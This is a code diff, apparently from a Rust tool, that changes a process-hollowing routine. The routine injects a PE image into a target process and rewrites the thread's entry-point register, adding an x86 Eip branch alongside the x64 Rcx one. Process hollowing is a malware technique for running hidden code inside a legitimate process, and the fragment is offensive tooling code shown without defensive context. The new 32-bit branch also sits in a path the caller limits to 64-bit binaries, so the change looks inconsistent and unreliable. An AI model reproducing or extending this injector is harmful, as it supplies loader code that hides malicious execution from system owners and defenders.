@@ -35,7 +35,8 @@ pub fn inject_and_execute(pe_data: &[u8], target_path: &str, verbose: bool) -> R
         return Err(anyhow!("Process Hollowing currently only supports 64-bit PE binaries"));
     }
 
-    hollow_process64(pe_data, target_path, verbose)
+        hollow_process64(pe_data, target_path, verbose)
+
 }
 
 fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<()> {
@@ -102,11 +103,21 @@ fn hollow_process64(pe_data: &[u8], target_path: &str, verbose: bool) -> Result<
             })?;
     }
 
-    // Update RCX (entry point for x64)
-    context.Rcx = (remote_base as u64) + entry_point as u64;
-
-    if verbose {
-        println!("Setting entry point to: 0x{:X}", context.Rcx);
+    // Update entry point register based on architecture
+    #[cfg(target_arch = "x86_64")]
+    {
+        context.Rcx = (remote_base as u64) + entry_point as u64;
+        if verbose {
+            println!("Setting entry point to: 0x{:X}", context.Rcx);
+        }
+    }
+    
+    #[cfg(target_arch = "x86")]
+    {
+        context.Eip = (remote_base as u32) + entry_point as u32;
+        if verbose {
+            println!("Setting entry point to: 0x{:X}", context.Eip);
+        }
     }
 
     unsafe {
